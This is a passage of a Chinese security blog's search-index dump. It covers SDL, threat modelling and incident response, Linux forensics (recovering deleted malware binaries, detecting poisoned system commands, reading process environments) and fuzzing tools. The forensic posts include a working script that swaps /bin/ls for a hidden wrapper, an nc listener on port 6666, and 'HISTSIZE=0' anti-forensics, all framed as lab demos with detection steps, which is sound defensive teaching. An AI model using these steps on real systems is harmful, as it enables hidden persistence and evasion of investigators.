SDL的门槛：第一，安全专家少，懂攻防又要懂开发，懂漏洞又要懂设计，对于研发部门缺少指导的安全设计；第二，工具支持少，静态代码扫描、动态Fuzz等，工欲善其事必先利其器。 因地制宜的SDL时间1.重度的场景：对于偏底层的大型软件，迭代周期较长，对架构设计要求比较全面，后期改动成本大，这种应在事前切入，在立项设计阶段就英国进行安全设计和威胁建模等工作。2.轻度的场景：架构简单、开发周期短、交付时间要求比较紧，SDL太过于笨重，攻防驱动修改就足以解决问题 SDL在互联网企业的发展SDL在大部分不差钱的互联网企业属于形式上都有，落地比较粗糙，通常只有一两个环节，瓶颈是人和工具的缺失。 STRIDE威胁建模 这是微软开发的用于威胁建模的工具，有助于风险识别的覆盖面 6个维度：Spoofing（假冒）【认证】、Tampering（篡改）【完整性】、Repudiation（否认）【不可抵赖性】、Information Disclosure（信息泄露）【机密性】、Denial of service（拒绝服务）【可用性】、Elevation of Privilege（权限提升）【授权】 如何使用：画出数据流关系图（DFD），包含四个元素：数据流、数据存储、进程和交互方，再加上信任边界 数据流：通过网络连接、命名管道、消息队列、RPC通道等移动的数据 数据存储：文本、文件、关系型数据库、非结构化数据等 进程：计算机运行的计算或程序 画出图后，对每个节点元素和过程进行分析判断是否存在上述的6个维度的威胁，并制定对应的风险缓解措施。 上面的high level的威胁建模，low level的威胁建模需要话了时序图后根据具体的协议和数据交互进行更进一步的分析。 关于ISO27001重建对安全标准的认知安全标准到底有什么用？归根结底为了给你一个参考和指引，当你把基础的技术防护手段实施之后，过了上任之初的救活阶段之后，就需要停下来思考一下整个企业安全范畴中，哪些事情是短板，哪些领域尚且空白，需要在哪些点上继续深挖才能覆盖公司整体的安全建设，而安全标准的价值就是告诉你，在安全建设的领域里可能有那么100件事情是需要做的，但具体选择只做80件还是99件还是100件全是你自己的事情，但标准也只告诉你100件事是什么，怎么实现，对应的技术方案和流程是没有的，实现和落地是需要自己想的，本质上是用于开拓视野。 最实用的参考 ITIL（BS15000/ISO20000）：运维侧安全，绝大多数互联网公司的运维流程都是以这个为骨架建立的，把安全环节衔接到所有的发布、变更、配置、问题和事件管理之上，而不是打破原来既有的运维流程，在去独创一个什么安全流程（ISO20000的前身是英国标准BS 15000，ITIL提供了IT服务管理的最佳实践和框架，而BS15000和ISO/IEC 20000则是IT服务管理的标准和认证体系。） SDL：研发侧的安全管理 ISO27001：安全管理领域的基础性安全标准 业务持续性管理业务持续性管理（BCM）：项目管理——风险分析和回顾——业务影响分析——恢复策略——计划实施——测试和演练——程序管理 关于应急响应PDCERF 模型是应急响应的一个通用框架，用于指导组织在发生安全事件时如何有效应对。PDCERF 模型的六个阶段分别是： 准备（Preparation）：在事件发生之前，组织需要做好充分的准备，包括制定应急计划、建立应急响应团队、培训人员等。包括工具准备，静态编译的ls,ifconfig,psdeng检测（Detection）：在事件发生后，组织需要尽快发现和识别事件，以便及时采取措施。遏制（Containment）：在事件发生后，组织需要采取措施控制事件，防止其扩大影响。根除（Eradication）：在事件发生后，组织需要采取措施消除事件的影响，并防止事件再次发生。恢复（Recovery）：在事件发生后，组织需要采取措施恢复业务，使其恢复到正常运行状态。跟踪（Follow-up）：在事件发生后，组织需要对事件进行跟踪和分析，以便总结经验教训，提高应急响应能力。 遏制或者作者说的抑制，首先要了解业务、数据流、各服务接口的调用关系，这些都是日常的积累，否则随便一个隔离又吧什么服务搞down了。如果安全团队平时连个数据流图都没有，发现单点出现问题，大致的系统间的影响和潜在的最大受害范围都估算不出来。 安全建设的马斯洛需求层次lv0：没有安全措施lv1：自己认为自己是安全的：做过渗透测试，交付的代码没有高危漏洞lv2：有救火的能力：由攻防团队，有基本的入侵检测能力lv3：安全体系化：接近完整的纵深防御体系，覆盖入侵检测和防护lv4：业务层面安全得到满足：账户的基础服务都有安全风控措施lv5：最佳实践阶段：完整的纵深防御，高度自动化、大数据和机器学习，精准对抗 业界的模糊地带大数据安全分类： Hadoop/Storm集群这套技术架构本身涉及的安全问题 海量样本+机器学习的方法去处理安全检测问题——360 由于处理的数据流比较大，需要Hadoop之类的技术解决数据规模和实时性这两个性能问题 解决方案的争议新概念新产品层出不穷，大多数不能说是替代，而只是演进、升级和补充。","categories":[],"tags":[{"name":"企业安全","slug":"企业安全","permalink":"https://www.giantbranch.cn/tags/企业安全/"}]},{"title":"如何从活动的Linux恶意软件中恢复已删除的二进制文件","slug":"如何从活动的Linux恶意软件中恢复已删除的二进制文件","date":"2023-07-21T00:00:00.000Z","updated":"2023-10-13T13:38:29.718Z","comments":true,"path":"2023/07/21/如何从活动的Linux恶意软件中恢复已删除的二进制文件/","link":"","permalink":"https://www.giantbranch.cn/2023/07/21/如何从活动的Linux恶意软件中恢复已删除的二进制文件/","excerpt":"","text":"通常，Linux恶意软件在启动后会自行删除，以免文件扫描器和完整性检查发现二进制文件的存在。这也会使得取得二进制文件变得困难，从而增加了取证分析的难度。 然而，在Linux上恢复已删除的进程二进制文件是很容易的，只要该进程仍然在内存中。 在 Linux 系统中，/proc/&lt;PID&gt;/exe 文件是一个特殊的符号链接文件，它指向当前正在运行的进程所执行的可执行文件。即使该可执行文件已经被删除，该符号链接仍然存在，并且可以继续指向被删除的文件。 这是因为 Linux 系统中的文件删除实际上是通过引用计数来处理的。当一个文件被打开或执行时，系统会为该文件增加一个引用计数。只有当该文件的引用计数降为零时，才会将其删除并释放磁盘空间。 所以恢复已删除的进程二进制文件的基本命令很简单。 1cp /proc/&lt;PID&gt;/exe /tmp/recovered_bin 恢复已删除的进程的实践下面以sleep命令来模拟一个已从磁盘中删除的进程。您可以在自己的Linux系统上安全地运行这一系列命令，以便练习恢复已删除的二进制文件。 1234cd /tmpcp /bin/sleep x./x 3600 &amp;rm x 123456789101112# root @ ubuntu in ~ [16:37:43]$ cd /tmp# root @ ubuntu in /tmp [16:37:45]$ cp /bin/sleep x# root @ ubuntu in /tmp [16:37:45]$ ./x 3600 &amp;[1] 13499# root @ ubuntu in /tmp [16:37:45]$ rm x# root @ ubuntu in /tmp [16:37:47]$ ls -al /tmp/xls: cannot access &apos;/tmp/x&apos;: No such file or directory 可以看到文件确实不存在了，进程还在运行 123$ ps -aux | grep 3600root 13499 0.0 0.0 9224 748 pts/0 S 16:37 0:00 ./x 3600root 13540 0.0 0.0 16180 1124 pts/0 S+ 16:38 0:00 grep --color=auto 3600 我们ls查看，可以看到文件被标记为删除了 12345$ ls -al /proc/13499/exelrwxrwxrwx 1 root root 0 7月 21 16:39 /proc/13499/exe -&gt; &apos;/tmp/x (deleted)&apos;# root @ ubuntu in /tmp [16:39:20]$ ls /tmp/xls: cannot access &apos;/tmp/x&apos;: No such file or directory 我们用cp恢复 1cp /proc/13499/exe /tmp/recovered_bin 可以看到文件完好无缺 123456# root @ ubuntu in /tmp [16:40:38]$ md5sum /tmp/recovered_bin 2fb28b5c237207b71c89ac6eb5861a5c /tmp/recovered_bin# root @ ubuntu in /tmp [16:40:48]$ md5sum /bin/sleep 2fb28b5c237207b71c89ac6eb5861a5c /bin/sleep 假如这正是一个病毒木马，你可以可以在安全的虚拟环境中，使用调试器和ida去分析了。 总结所以，绝不要轻易杀掉你发现的可疑进程，你可能失去获取病毒木马的机会。 如果系统感染了某种病毒，请将其隔离在网络中，然后慢慢查看。不要急于行动，因为这样会破坏关键数据。","categories":[],"tags":[{"name":"取证","slug":"取证","permalink":"https://www.giantbranch.cn/tags/取证/"}]},{"title":"检测Linux二进制文件污染","slug":"检测Linux二进制文件污染","date":"2023-07-21T00:00:00.000Z","updated":"2023-10-13T13:38:31.898Z","comments":true,"path":"2023/07/21/检测Linux二进制文件污染/","link":"","permalink":"https://www.giantbranch.cn/2023/07/21/检测Linux二进制文件污染/","excerpt":"","text":"概述二进制污染是篡改系统命令并用恶意版本替换它。这可以是全面替换为一个新文件，设计成像旧命令一样运行，或者篡改原地可执行文件，使其直接运行恶意代码。 如果一个毫不知情的用户运行了一个被污染的命令，就是以该用户身份运行攻击者想要执行的代码。 简单污染示例下面的shell模拟污染/bin/ls 注意：不要在生成环境中进行下面的实验操作！！！注意：不要在生成环境中进行下面的实验操作！！！注意：不要在生成环境中进行下面的实验操作！！！ 1234567891011121314151617181920212223242526272829303132# root @ ubuntu in ~/tmp [16:09:03]$ cat poison_test.sh #!/usr/bin/env bash# Linux binary poisoning example.# Based on backdoorme poison script.echo &quot;Poisoning ls command.&quot;echo &quot;Making backup of ls to /bin/ls.bak&quot;if [ ! -f /bin/ls.bak ]; then cp /bin/ls /bin/ls.bakfiecho &quot;Making /bin/.bin to hold original binary&quot;mkdir /bin/.binecho &quot;Moving original binary to /bin/.bin&quot;mv /bin/ls /bin/.bin/echo &quot;Creating poisoned ls script in /bin&quot;echo &quot;#!/bin/bash&quot; &gt; /bin/lsecho &quot;( ls &amp; ) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; /bin/.bin/ls \\$@&quot; &gt;&gt; /bin/lsecho &quot;echo \\&quot;POISONED /bin/ls active!\\&quot;&quot; &gt;&gt; /bin/lschmod +x /bin/lsecho &quot;Done&quot;# root @ ubuntu in ~/tmp [16:09:11]$ bash ./poison_test.sh Poisoning ls command.Making backup of ls to /bin/ls.bakMaking /bin/.bin to hold original binaryMoving original binary to /bin/.binCreating poisoned ls script in /binDone 当然上面是写了无害的echo \\&quot;POISONED /bin/ls active!\\&quot; ，我们可以做任何shell可以做的操作，添加crontab，往authorized_keys添加公钥，下载木马等等。 可以看到ls已经被我们污染了 12345678$ ls /tmp/systemd-private-eac9d075027e4c038c766b9a8b7d0834-apache2.service-O1DAvqsystemd-private-eac9d075027e4c038c766b9a8b7d0834-colord.service-txti0Psystemd-private-eac9d075027e4c038c766b9a8b7d0834-ModemManager.service-CUXkDrsystemd-private-eac9d075027e4c038c766b9a8b7d0834-rtkit-daemon.service-EkyD2vsystemd-private-eac9d075027e4c038c766b9a8b7d0834-systemd-resolved.service-bRmKdMsystemd-private-eac9d075027e4c038c766b9a8b7d0834-systemd-timesyncd.service-pcKTtwPOISONED /bin/ls active! 在Linux上手动查找被感染的命令如果手动去寻找，非常耗时，且很难下手。在Ubuntu系统中，仅在/bin和/sbin目录下就有500多个命令。如果再加上/usr/bin和/usr/sbin目录，那就有数千个命令了。因此，首先要尝试的是运行软件包验证来加快这个过程。 假如是Redhat based的系统，可以执行rpm -Va | grep ^..5. 假如是Debian/Ubuntu based的系统，可以apt安装debsums，执行debsums -c 下面我以Ubuntu为例，可以看到，debsums 很快发现了/bin/ls不对劲 123# root @ ubuntu in ~ [16:11:56]$ debsums -c/bin/ls 假如上面debsums 没有发现任何内容，接下来我们需要手动操作，查找不是ELF的可执行文件，当然攻击者可以用另一个编译好的二进制文件替换一个二进制文件。但是替换shell是最容易实现的 比如针对/bin目录: file /bin/* | grep -v ELF | grep -v link, grep -v link是忽略掉软链接文件 1234567891011121314151617181920212223242526$ file /bin/* | grep -v ELF | grep -v link/bin/bzdiff: POSIX shell script, ASCII text executable/bin/bzexe: POSIX shell script, ASCII text executable/bin/bzgrep: POSIX shell script, ASCII text executable/bin/bzmore: POSIX shell script, ASCII text executable/bin/egrep: POSIX shell script, ASCII text executable/bin/fgrep: POSIX shell script, ASCII text executable/bin/gunzip: POSIX shell script, ASCII text executable/bin/gzexe: POSIX shell script, ASCII text executable/bin/lesspipe: POSIX shell script, ASCII text executable/bin/ls: Bourne-Again shell script, ASCII text executable/bin/red: POSIX shell script, ASCII text executable/bin/setupcon: POSIX shell script, UTF-8 Unicode text executable/bin/uncompress: POSIX shell script, ASCII text executable/bin/unicode_start: POSIX shell script, ASCII text executable/bin/which: POSIX shell script, ASCII text executable/bin/zcat: POSIX shell script, ASCII text executable/bin/zcmp: POSIX shell script, ASCII text executable/bin/zdiff: POSIX shell script, ASCII text executable/bin/zegrep: POSIX shell script, ASCII text executable/bin/zfgrep: POSIX shell script, ASCII text executable/bin/zforce: POSIX shell script, ASCII text executable/bin/zgrep: POSIX shell script, ASCII text executable/bin/zless: POSIX shell script, ASCII text executable/bin/zmore: POSIX shell script, ASCII text executable/bin/znew: POSIX shell script, ASCII text executable 我们可以看到这里也有/bin/ls，而且还是个Bourne-Again shell script，这就很有问题了。 如果你怀疑某个命令可能被篡改，请直接使用strings命令查看是否有任何可疑内容。不要对你认为可能是恶意文件的任何文件运行strace命令。我们将这一点用粗体标出，因为有些人可能想尝试strace命令，但实际上运行strace会在主机上运行实际的可执行文件，这是一个非常糟糕的想法。 1234$ strings /bin/ls#!/bin/bash( ls &amp; ) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; /bin/.bin/ls $@echo &quot;POISONED /bin/ls active!&quot; 可以看到这里还有隐藏目录/bin/.bin/ 最后我们用rm -rf /bin/.bin/ &amp;&amp; mv /bin/ls.bak /bin/ls来恢复ls 参考https://sandflysecurity.com/blog/detecting-linux-binary-file-poisoning/","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://www.giantbranch.cn/tags/test/"}]},{"title":"使用Linux进程环境变量进行取证","slug":"使用Linux进程环境变量进行取证","date":"2023-07-20T00:00:00.000Z","updated":"2023-10-13T13:38:28.898Z","comments":true,"path":"2023/07/20/使用Linux进程环境变量进行取证/","link":"","permalink":"https://www.giantbranch.cn/2023/07/20/使用Linux进程环境变量进行取证/","excerpt":"","text":"注：下面来自半翻译，半实践 对Linux进程进行取证，可以通过/proc/&lt;PID&gt;/environ来查看某个进程的环境变量，来获取一些信息。 所以说，遇到可疑的进程不要立即杀掉，不然取证都可能无从下手。 背景当在Linux上启动一个进程时，该进程的许多环境变量将在其运行期间保持不变。那么虽然启动该进程的原始shell已经消失很久，但在有一些shell变量仍然继承下来了。 在进程的环境变量中可以获得什么呢? history anti-forensics的证据 二进制文件的命令行和路径 启动进程的用户 启动时二进制文件使用的自定义变量，可能包含密钥和其他内容 SSH连接信息：哪个ip启动的 …… 对于第5点，即使攻击者从日志中清除了他们的IP地址，如果他们通过SSH进入，很有可能他们使用的IP地址仍然留在他们启动的进程中，等待被获取。 模拟实验模拟攻击 假如我们是攻击者，连上一台机子的ssh 注： HISTSIZE是一个环境变量，用于控制命令历史记录的大小。通过将HISTSIZE设置为0，即export HISTSIZE=0，实际上是告诉操作系统不保存任何命令历史记录。这意味着你运行的每个命令都不会被记录下来，无法通过上下箭头键或history命令访问之前执行的命令。 ssh连上后我们在机子上执行 1234export HISTSIZE=0export PATH=.:$PATHcp /bin/nc xx -lp 6666 &amp; 取证通过列出正在监听的端口，可以查看到一个x的可疑进程。 12345678910$ netstat -antp | grep LISTENtcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 391/rpcbind tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 392/systemd-resolve tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 874/sshd tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN 32334/cupsd tcp 0 0 0.0.0.0:6666 0.0.0.0:* LISTEN 16343/x tcp6 0 0 :::111 :::* LISTEN 391/rpcbind tcp6 0 0 :::80 :::* LISTEN 1050/apache2 tcp6 0 0 :::22 :::* LISTEN 874/sshd tcp6 0 0 ::1:631 :::* LISTEN 32334/cupsd 查看进程环境变量（我手动将ip用X打码了） 12345678910111213141516171819202122232425262728293031323334353637$ strings /proc/16343/environ LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:LC_MEASUREMENT=zh_CN.UTF-8SSH_CONNECTION=10.82.X.X 5561 172.16.2.3 22LESSCLOSE=/usr/bin/lesspipe %s %sLC_PAPER=zh_CN.UTF-8LC_MONETARY=zh_CN.UTF-8LANG=en_US.UTF-8OLDPWD=/rootS_COLORS=autoLC_NAME=zh_CN.UTF-8XDG_SESSION_ID=2246USER=rootGOPATH=/root/goQT_QPA_PLATFORMTHEME=appmenu-qt5PWD=/tmpHOME=/rootGOROOT=/usr/local/goSSH_CLIENT=10.82.X.X 5561 22LC_ADDRESS=zh_CN.UTF-8LC_NUMERIC=zh_CN.UTF-8SSH_TTY=/dev/pts/0MAIL=/var/mail/rootTERM=xtermSHELL=/bin/bashSHLVL=1LC_TELEPHONE=zh_CN.UTF-8LOGNAME=rootDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/busXDG_RUNTIME_DIR=/run/user/0PATH=.:.:/usr/lib/llvm-11/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/go/bin:/root/go/binLC_IDENTIFICATION=zh_CN.UTF-8PS1=\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\e[34m\\]#\\[\\e[m\\] \\[\\e[37m\\]\\u\\[\\e[m\\] @ \\[\\e[36m\\]\\h\\[\\e[m\\] in \\[\\e[34m\\]\\w\\[\\e[m\\] [\\t]\\n$ HISTSIZE=0LESSOPEN=| /usr/bin/lesspipe %sLC_TIME=zh_CN.UTF-8_=./x 从上面我们可以提取出下面有用的信息 HISTSIZE=0，这个说过了，属于反取证的方式 SSH_CONNECTION=10.82.X.X 5561 172.16.2.3 22 这个比下面的多了本机的网卡的ip SSH_CLIENT=10.82.X.X 5561 22 这两个就是ssh的信息，10.82.X.X就是攻击者所使用的ip，该ip或许只是攻击者的跳板 SHELL=/bin/bash 启动所使用的shell PWD=/tmp 启动时的路径 OLDPWD=/root 进入/tmp目录之前的路径 USER=root 启动进程的用户 总结可以看到，在调查进程活动之前，不要草率地终止可疑的进程。在弄清楚进程活动之前就终止进程，会立即丢失许多有用的信息，比如进程环境变量。 参考https://sandflysecurity.com/blog/using-linux-process-environment-variables-for-live-forensics/","categories":[],"tags":[{"name":"环境变量","slug":"环境变量","permalink":"https://www.giantbranch.cn/tags/环境变量/"},{"name":"取证","slug":"取证","permalink":"https://www.giantbranch.cn/tags/取证/"}]},{"title":"pastis样本同步代码阅读记录","slug":"pastis样本同步代码阅读记录","date":"2023-06-29T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2023/06/29/pastis样本同步代码阅读记录/","link":"","permalink":"https://www.giantbranch.cn/2023/06/29/pastis样本同步代码阅读记录/","excerpt":"","text":"简单看下https://github.com/quarkslab/pastis/的样本同步相关的代码 fuzz端fuzz端就两个功能，发送新增的样本或者crash，以及接收新样本 发送新增样本或者crash以afl++为例： https://github.com/quarkslab/pastis/blob/56f71b9c7cf25ddf2035d1abbe35f67d55378bb9/engines/pastis-aflpp/pastisaflpp/driver.py#L51 会对corpus_dir和crash_dir的文件创建进行hook，一旦有新的文件创建，就调用__send_seed和__send_crash函数, afl的fuzzer_stats文件有修改也会调用__send_telemetry发送 1234# Configure hookds on workspaceself.workspace.add_creation_hook(self.workspace.corpus_dir, self.__send_seed)self.workspace.add_creation_hook(self.workspace.crash_dir, self.__send_crash)self.workspace.add_file_modification_hook(self.workspace.stats_dir, self.__send_telemetry) 下面就是发送函数 12345678910111213141516171819def __send_seed(self, filename: Path): self.__send(filename, SeedType.INPUT)def __send_crash(self, filename: Path): # Skip README file that AFL adds to the crash folder. if filename.name != &apos;README.txt&apos;: self.__send(filename, SeedType.CRASH)def __send(self, filename: Path, typ: SeedType): self._tot_seeds += 1 file = Path(filename) raw = file.read_bytes() h = self.hash_seed(raw) logging.debug(f&apos;[&#123;typ.name&#125;] Sending new: &#123;h&#125; [&#123;self._tot_seeds&#125;]&apos;) if h not in self._seed_recvs: self._agent.send_seed(typ, raw) else: logging.info(&quot;seed (previously sent) do not send it back&quot;) self._queue_to_send.append((filename, True if typ == SeedType.CRASH else False)) 接收新样本在class AFLPPDriver类的__init__函数会调用self.__setup_agent()来初始化回调函数 1234def __setup_agent(self): # Register callbacks. self._agent.register_seed_callback(self.__seed_received) self._agent.register_stop_callback(self.__stop_received) 接收函数 12345def __seed_received(self, typ: SeedType, seed: bytes): h = self.hash_seed(seed) logging.info(f&quot;[SEED] received &#123;h&#125; (&#123;typ.name&#125;)&quot;) self._seed_recvs.add(h) self.add_seed(seed) 通过add_seed可以看到，通过md5文件名存储，说明通过md5去重的 123def add_seed(self, seed: bytes): seed_path = self.workspace.dynamic_input_dir / f&quot;seed-&#123;hashlib.md5(seed).hexdigest()&#125;&quot; seed_path.write_bytes(seed) 服务端下面是收到样本（seed）的回调函数 12345678def register_seed_callback(self, cb: Callable) -&gt; None: &quot;&quot;&quot; Register a callback called when an input seed is received from the broker. The callback function take 2 parameters seed type and content. :param cb: callback function &quot;&quot;&quot; self.register_callback(MessageType.INPUT_SEED, cb) 在set_proxy函数中会设置这个回调函数 1234567def _register_all(self): self.register_seed_callback(self.seed_received) self.register_hello_callback(self.hello_received) self.register_log_callback(self.log_received) self.register_telemetry_callback(self.telemetry_received) self.register_stop_coverage_callback(self.stop_coverage_received) self.register_data_callback(self.data_received) 而在PastisBroker类的__init__函数会调用self._register_all()，收到种子后就调用seed_received函数 可以看到这里哦天哪故宫md5计算，但是没用来判断，只是用_seed_pool这个字段判断， 12345678910111213141516171819202122232425def seed_received(self, cli_id: bytes, typ: SeedType, seed: bytes): cli = self.get_client(cli_id) if not cli: return is_new = seed not in self._seed_pool h = md5(seed).hexdigest() # Show log message and save seed to file self.statmanager.update_seed_stat(cli, typ) # Add info only if new cli.log(LogLevel.INFO, f&quot;seed &#123;h&#125; [&#123;self._colored_seed_type(typ)&#125;][&#123;self._colored_seed_newness(is_new)&#125;]&quot;) cli.add_own_seed(seed) # Add seed in client&apos;s seed self.write_seed(typ, cli.strid, seed) # Write seed to file if is_new: self._seed_pool[seed] = typ # Save it in the local pool else: pass # logging.warning(f&quot;receive duplicate seed &#123;h&#125; by &#123;cli.strid&#125;&quot;) # Iterate on all clients and send it to whomever never received it if self.broker_mode == BrokingMode.FULL: self.send_seed_to_all_others(cli.netid, typ, seed) if self.is_proxied: # Forward it to the proxy self._proxy.send_seed(typ, seed)","categories":[],"tags":[{"name":"样本同步","slug":"样本同步","permalink":"https://www.giantbranch.cn/tags/样本同步/"}]},{"title":"试用clusterfuzzlite","slug":"试用clusterfuzzlite","date":"2023-06-20T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2023/06/20/试用clusterfuzzlite/","link":"","permalink":"https://www.giantbranch.cn/2023/06/20/试用clusterfuzzlite/","excerpt":"","text":"clusterfuzzlite是是一种持续的模糊测试解决方案，作为持续集成 (CI) 工作流的一部分运行，比如我们一旦push代码，便可以自动build，之后自动fuzz。 比如它支持GitHub Actions，GitLab，Google Cloud Build和Prow，我们最常见到的应该是GitHub Actions 如何让项目支持clusterfuzzlite呢ClusterFuzzLite 重用了 OSS-Fuzz 工具链来简化构建。这意味着 ClusterFuzzLite 将在 docker 容器中构建您的项目。所以加入你熟悉OSS-Fuzz，这就看着很像了。只不过多了一些参数，比如–external 有一个问题就是他这个只支持libfuzzer！！！，所以局限性还是有的。 环境配置及文件编辑首先环境的配置好： python什么的必备 安装好docker 下载oss-fuzz： git clone https://github.com/google/oss-fuzz.git 首先需要在项目根目录新建.clusterfuzzlite文件夹，包含下面三个文件 .clusterfuzzlite/project.yaml .clusterfuzzlite/Dockerfile .clusterfuzzlite/build.sh 上面的文件不用我们新建，可以使用命令新建模板 123$ cd /path/to/oss-fuzz$ export PATH_TO_PROJECT=&lt;path_to_your_project&gt;$ python infra/helper.py generate --external --language=c++ $PATH_TO_PROJECT 以https://github.com/libexpat/libexpat.git为例 123cd / &amp;&amp; git clone https://github.com/libexpat/libexpat.git expatexport PATH_TO_PROJECT=/expatpython infra/helper.py generate --external --language=c $PATH_TO_PROJECT 主要编辑build.sh文件即可，主要最后编译出来的fuzzer需要复制到$OUT即可 1234567891011121314151617181920212223242526272829303132333435cd $SRC/expat/: $&#123;LD:=&quot;$&#123;CXX&#125;&quot;&#125;: $&#123;LDFLAGS:=&quot;$&#123;CXXFLAGS&#125;&quot;&#125; # to make sure we link with sanitizer runtimecmake_args=( # Specific to Expat -DEXPAT_BUILD_FUZZERS=ON -DEXPAT_OSSFUZZ_BUILD=ON -DEXPAT_SHARED_LIBS=OFF # C compiler -DCMAKE_C_COMPILER=&quot;$&#123;CC&#125;&quot; -DCMAKE_C_FLAGS=&quot;$&#123;CFLAGS&#125;&quot; # C++ compiler -DCMAKE_CXX_COMPILER=&quot;$&#123;CXX&#125;&quot; -DCMAKE_CXX_FLAGS=&quot;$&#123;CXXFLAGS&#125;&quot; # Linker -DCMAKE_LINKER=&quot;$&#123;LD&#125;&quot; -DCMAKE_EXE_LINKER_FLAGS=&quot;$&#123;LDFLAGS&#125;&quot; -DCMAKE_MODULE_LINKER_FLAGS=&quot;$&#123;LDFLAGS&#125;&quot; -DCMAKE_SHARED_LINKER_FLAGS=&quot;$&#123;LDFLAGS&#125;&quot;)mkdir -p buildcd buildcmake ../expat &quot;$&#123;cmake_args[@]&#125;&quot;make -j$(nproc)for fuzzer in fuzz/*;do cp $fuzzer $OUTdone 本地测试 上搞完就可以本地测试了 构建您的 docker 镜像和 fuzz 目标 模板命令 12$ python infra/helper.py build_image --external $PATH_TO_PROJECT$ python infra/helper.py build_fuzzers --external $PATH_TO_PROJECT --sanitizer &lt;address/undefined/memory&gt; 实际命令 12python infra/helper.py build_image --external $PATH_TO_PROJECTpython infra/helper.py build_fuzzers --external $PATH_TO_PROJECT --sanitizer address 假如没问题说明build.sh写得没问题，环境库依赖也没问题 通过运行 check_build 命令查找要修复的常见构建问题 这将检查您的模糊测试目标是否使用正确的sanitizer编译，并且在模糊测试几秒钟后不会崩溃。 1$ python infra/helper.py check_build --external $PATH_TO_PROJECT --sanitizer &lt;address/undefined/memory&gt; 运行特定的模糊测试目标，使用 run_fuzzer 1$ python infra/helper.py run_fuzzer --external --corpus-dir=&lt;path-to-temp-corpus-dir&gt; $PATH_TO_PROJECT &lt;fuzz_target&gt; &lt;path-to-temp-corpus-dir&gt;就是宿主机你自己准备好的种子文件路径&lt;fuzz_target&gt;是编译出来的fuzzer的名字 如果您打算使用 ClusterFuzzLite 的代码覆盖率报告功能，最好测试覆盖率报告生成是否有效。这将使用本地语料库目录中上一个 run_fuzzer 步骤生成的语料库。 12$ python infra/helper.py build_fuzzers --external --sanitizer coverage $PATH_TO_PROJECT$ python infra/helper.py coverage --external $PATH_TO_PROJECT --fuzz-target=&lt;fuzz_target&gt; --corpus-dir=&lt;path-to-temp-corpus-dir&gt; 步骤4是可选的，run_fuzzer没问题即可就行了 Running ClusterFuzzLiteClusterFuzzLite可以以pull request为触发，也可以cron定时触发 下面就以GitHub Actions为例了，需要在.github/workflows目录新建文件 1234.github/workflows/cflite_pr.yml (for PR fuzzing, pull request为触发).github/workflows/cflite_build.yml (for continuous builds, 用于持续构建，push代码就执行build).github/workflows/cflite_batch.yml (for batch fuzzing，用于批量模糊测试).github/workflows/cflite_cron.yml(for tasks done on a cron schedule: pruning and coverage) 之后展示了一些默认的配置设置，默认配置已经适用于大多数项目 .github/workflows/cflite_pr.yml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748name: ClusterFuzzLite PR fuzzingon: pull_request: paths: - &apos;**&apos;permissions: read-alljobs: PR: runs-on: ubuntu-latest concurrency: group: $&#123;&#123; github.workflow &#125;&#125;-$&#123;&#123; matrix.sanitizer &#125;&#125;-$&#123;&#123; github.ref &#125;&#125; cancel-in-progress: true strategy: fail-fast: false matrix: sanitizer: - address # Override this with the sanitizers you want. # - undefined # - memory steps: - name: Build Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;) id: build uses: google/clusterfuzzlite/actions/build_fuzzers@v1 with: language: c++ # Change this to the 